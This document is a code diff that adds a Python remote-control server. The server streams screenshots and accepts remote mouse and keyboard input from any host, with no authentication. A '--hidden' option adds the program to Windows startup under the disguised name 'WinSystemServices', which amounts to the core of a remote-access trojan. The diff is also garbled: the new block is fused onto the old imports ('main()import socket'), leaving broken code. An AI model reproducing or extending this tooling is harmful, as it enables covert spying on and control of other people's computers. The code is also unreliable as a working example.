@@ -5,6 +5,228 @@ import zlib
 import os
 import sys
 import time
+import cv2
+import numpy as np
+
+
+SERVER_PORT = 5555
+ALLOWED_IPS = []
+SCREENSHOT_QUALITY = 70
+SCREENSHOT_INTERVAL = 0.5
+
+
+def get_system_info():
+    import platform
+    import socket as sock
+    pc_name = sock.gethostname()
+    os_version = platform.platform()
+    return f"{pc_name}|{os_version}"
+
+
+def auto_run():
+    try:
+        import winreg
+        exe_path = os.path.abspath(sys.executable)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "WinSystemServices", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+    except:
+        pass
+
+
+def handle_client(client_socket, addr):
+    try:
+        client_socket.sendall(f"INFO:{get_system_info()}".encode('utf-8'))
+    except:
+        pass
+    
+    while True:
+        try:
+            data = client_socket.recv(4096)
+            if not data:
+                break
+            
+            try:
+                message = data.decode('utf-8')
+            except UnicodeDecodeError:
+                continue
+            
+            if message.startswith("MOUSE:"):
+                parts = message[6:].split(",")
+                if len(parts) >= 3:
+                    try:
+                        action = parts[0]
+                        x, y = int(parts[1]), int(parts[2])
+                        
+                        if action == "LEFT_DOWN":
+                            pyautogui.mouseDown(x, y, button='left')
+                        elif action == "LEFT_UP":
+                            pyautogui.mouseUp(x, y, button='left')
+                        elif action == "RIGHT_DOWN":
+                            pyautogui.mouseDown(x, y, button='right')
+                        elif action == "RIGHT_UP":
+                            pyautogui.mouseUp(x, y, button='right')
+                        elif action == "MOVE":
+                            pyautogui.moveTo(x, y)
+                        elif action == "CLICK":
+                            pyautogui.click(x, y, button='left')
+                        elif action == "RIGHT_CLICK":
+                            pyautogui.click(x, y, button='right')
+                    except (ValueError, Exception) as e:
+                        print(f"Ошибка мыши: {e}")
+            
+            elif message.startswith("click:"):
+                parts = message[6:].split(":")
+                if len(parts) >= 2:
+                    try:
+                        x, y = int(parts[0]), int(parts[1])
+                        pyautogui.click(x, y, button='left')
+                        print(f"Клик: {x}, {y}")
+                    except (ValueError, Exception) as e:
+                        print(f"Ошибка click:x:y: {e}")
+            
+            elif message.startswith("KEY:"):
+                key_data = message[4:]
+                try:
+                    if key_data == "ENTER":
+                        pyautogui.press('enter')
+                    elif key_data == "TAB":
+                        pyautogui.press('tab')
+                    elif key_data == "ESC":
+                        pyautogui.press('esc')
+                    elif key_data == "BACKSPACE":
+                        pyautogui.press('backspace')
+                    elif key_data == "SPACE":
+                        pyautogui.press('space')
+                    elif key_data.startswith("TEXT:"):
+                        text = key_data[5:]
+                        pyautogui.write(text)
+                    else:
+                        pyautogui.press(key_data.lower())
+                except Exception as e:
+                    print(f"Ошибка клавиатуры: {e}")
+            
+            elif message == "PING":
+                try:
+                    client_socket.sendall(b"PONG")
+                except:
+                    break
+                    
+        except ConnectionResetError:
+            break
+        except Exception as e:
+            print(f"Ошибка: {e}")
+            break
+    
+    try:
+        client_socket.close()
+    except:
+        pass
+
+
+def send_screenshots(client_socket):
+    while True:
+        try:
+            screenshot = pyautogui.screenshot()
+            img_array = np.array(screenshot)
+            img_bgr = cv2.cvtColor(img_array, cv2.COLOR_RGB2BGR)
+            
+            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), SCREENSHOT_QUALITY]
+            result, encoded_img = cv2.imencode('.jpg', img_bgr, encode_param)
+            
+            if not result:
+                continue
+                
+            image_data = encoded_img.tobytes()
+            compressed = zlib.compress(image_data, level=6)
+            
+            size = len(compressed)
+            try:
+                client_socket.sendall(size.to_bytes(4, byteorder='big'))
+                client_socket.sendall(compressed)
+            except:
+                break
+            
+        except Exception as e:
+            print(f"Ошибка скриншота: {e}")
+            break
+        
+        time.sleep(SCREENSHOT_INTERVAL)
+
+
+def client_handler(client_socket, addr):
+    try:
+        if ALLOWED_IPS and addr[0] not in ALLOWED_IPS:
+            try:
+                client_socket.sendall(f"BLOCKED:IP not allowed".encode('utf-8'))
+            except:
+                pass
+            try:
+                client_socket.close()
+            except:
+                pass
+            return
+        
+        try:
+            client_socket.sendall(b"CONNECTED")
+        except:
+            return
+        
+        handler_thread = threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True)
+        handler_thread.start()
+        
+        send_screenshots(client_socket)
+        
+    except Exception as e:
+        print(f"Ошибка клиента: {e}")
+    finally:
+        try:
+            client_socket.close()
+        except:
+            pass
+
+
+def main():
+    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
+        auto_run()
+    
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    try:
+        server.bind(("0.0.0.0", SERVER_PORT))
+        server.listen(5)
+        print(f"Сервер запущен на порту {SERVER_PORT}")
+    except Exception as e:
+        print(f"Не удалось запустить: {e}")
+        return
+    
+    while True:
+        try:
+            client_socket, addr = server.accept()
+            print(f"Подключение от {addr[0]}")
+            
+            thread = threading.Thread(target=client_handler, args=(client_socket, addr), daemon=True)
+            thread.start()
+            
+        except KeyboardInterrupt:
+            print("Сервер остановлен")
+            break
+        except Exception as e:
+            print(f"Ошибка: {e}")
+            continue
+    
+    server.close()
+
+
+if __name__ == "__main__":
+    main()import socket
+import threading
+import pyautogui
+import zlib
+import os
+import sys
+import time
 import base64
 from io import BytesIO
 from PIL import Image
